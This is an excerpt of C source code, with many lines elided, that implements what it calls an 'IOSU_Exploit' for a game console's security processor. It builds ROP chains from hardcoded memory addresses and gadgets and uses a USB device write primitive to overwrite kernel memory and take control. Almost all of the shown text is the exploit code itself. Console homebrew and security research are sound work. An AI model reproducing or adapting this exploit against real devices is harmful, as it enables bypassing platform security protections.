...
int USB_Write32(int fd, uint32_t *someOtherPointer, uint32_t addr,
                uint32_t value) {
...
void IOSU_Exploit(int *confirm) {
  ...
  firstRopChain[0x060 / 4] = 0x101001DC; // thread_stack, we need to patch some
                                         // code using the CreateThread exploit
  ...
  firstRopChain[0x07C / 4] =
      1; // Thread Priority 	(the syscall actually reads it from the stack)
  firstRopChain[0x080 / 4] = 2; // Thread Flags 	(the syscall actually
                                // reads it from the stack too)
  ...
  firstRopChain[0x0BC / 4] =
      0x1012EA68; // at this point, sp = 0x1016AD78 + 0xC0
  ...
  iosUsbRopChain[0x03C / 4] =
      STR_R0_R5_0x1C__POP_R4_R5_PC; // *(int*)(0x01FFF000 - 4) =
                                    // IOS_CreateMessageQueue(...)
  ...
  /* IOS_DCFlushRange(0x08135000, 0x4001); */ /* flush and clear the entire data
                                                 cache */
  ...
  iosUsbRopChain[0x1A8 / 4] =
      USB_EndTextSection; // reply + back to the IOS-USB main loop code

  DCFlushRange(iosUsbRopChain, 0x4000);

  int32_t fd = (int32_t)IOS_Open("/dev/uhs/0", 0);

  uint32_t *fakeInternalRootHub = (uint32_t *)__OSPhysicalToEffectiveCached(
      0x10146080 + 0xFFF415D4 * 0x144 + 0x39ec);
  ...
  *(uint32_t *)0xF4148000 = arm_user_bin_len;
  ...
  USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x14,
              0x1016AD40 + 0x14 + 0x4 + 0x20);
  USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x10, 0x1011814C);
  USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x0C,
              (uint32_t)OSEffectiveToPhysical(firstRopChain));
  int rc = USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x00, 0x1012392b);

  if (rc == 1337 && confirm) {
    *confirm = 1;
    DBG_LOG("IOSU Exploit worked\n");
  }
